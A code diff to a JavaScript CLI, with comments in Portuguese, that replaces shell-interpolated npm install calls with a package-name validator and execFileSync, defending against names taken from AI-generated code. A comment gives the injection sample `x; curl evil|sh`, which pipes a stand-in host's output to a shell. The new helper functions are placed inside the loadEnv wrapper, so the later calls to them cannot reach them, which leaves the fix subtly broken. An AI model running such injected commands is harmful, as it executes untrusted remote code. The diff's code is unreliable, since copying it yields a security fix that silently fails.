@@ -29,7 +29,30 @@ function loadEnvFile(filePath, overwrite) {
 (function loadEnv() {
   const home = process.env.HOME || process.env.USERPROFILE || '';
   loadEnvFile(path.join(home, '.iacmp', 'config'), false);
-  const cwd = process.env.IACMP_CWD || process.cwd();
+  
+// Nomes de pacote vindos de erro do tsc sobre código GERADO POR IA são entrada
+// NÃO confiável: `x; curl evil|sh` viraria comando. Gramática restrita + npm
+// sem shell e sem lifecycle scripts (espelha src/generation/npm-safe.ts, que o
+// resto do CLI usa — aqui é inline porque este arquivo é JS standalone).
+function isSafeNpmPackageName(name) {
+  if (typeof name !== 'string' || name.length === 0 || name.length > 214) return false;
+  if (/[^a-z0-9@/._~-]/.test(name)) return false;
+  if (name.startsWith('-') || name.startsWith('.') || name.startsWith('_')) return false;
+  return /^(@[a-z0-9][a-z0-9._~-]*\/)?[a-z0-9][a-z0-9._~-]*$/.test(name);
+}
+
+function npmInstallUntrusted(packages, cwd, stdio) {
+  const safe = packages.filter(isSafeNpmPackageName);
+  const rejected = packages.filter(p => !isSafeNpmPackageName(p));
+  if (rejected.length > 0) {
+    process.stderr.write(chalk.yellow(`Ignorado (nome de pacote inválido): ${rejected.join(', ')}\n`));
+  }
+  if (safe.length === 0) return [];
+  cp.execFileSync('npm', ['install', '--ignore-scripts', ...safe], { cwd, stdio: stdio || 'pipe' });
+  return safe;
+}
+
+const cwd = process.env.IACMP_CWD || process.cwd();
   loadEnvFile(path.resolve(cwd, '.env'), true);
 })();
 
@@ -389,7 +412,7 @@ async function runGeneration(provider, session, lastPrompt, projectContext, aiPr
       if (missingModules.length > 0) {
         process.stderr.write(chalk.dim(`Instalando: ${missingModules.join(', ')}...\n`));
         try {
-          cp.execSync(`npm install ${missingModules.join(' ')}`, { cwd, stdio: 'pipe' });
+          npmInstallUntrusted(missingModules, cwd, 'pipe');
           process.stderr.write(chalk.green(`✓ Instalado: ${missingModules.join(', ')}\n`));
           result = validateTypeScript(tsFiles, cwd);
         } catch {
@@ -456,7 +479,7 @@ async function runGeneration(provider, session, lastPrompt, projectContext, aiPr
       const pkgs = [...toInstall];
       process.stdout.write(`\nInstalando dependências: ${pkgs.join(', ')}...\n`);
       try {
-        cp.execSync(`npm install ${pkgs.join(' ')}`, { cwd, stdio: 'inherit' });
+        npmInstallUntrusted(pkgs, cwd, 'inherit');
         process.stdout.write(`✓ Instalado: ${pkgs.join(', ')}\n\n`);
       } catch (err) {
         process.stdout.write(`✗ Falha ao instalar ${pkgs.join(', ')}: ${err.message}\n\n`);
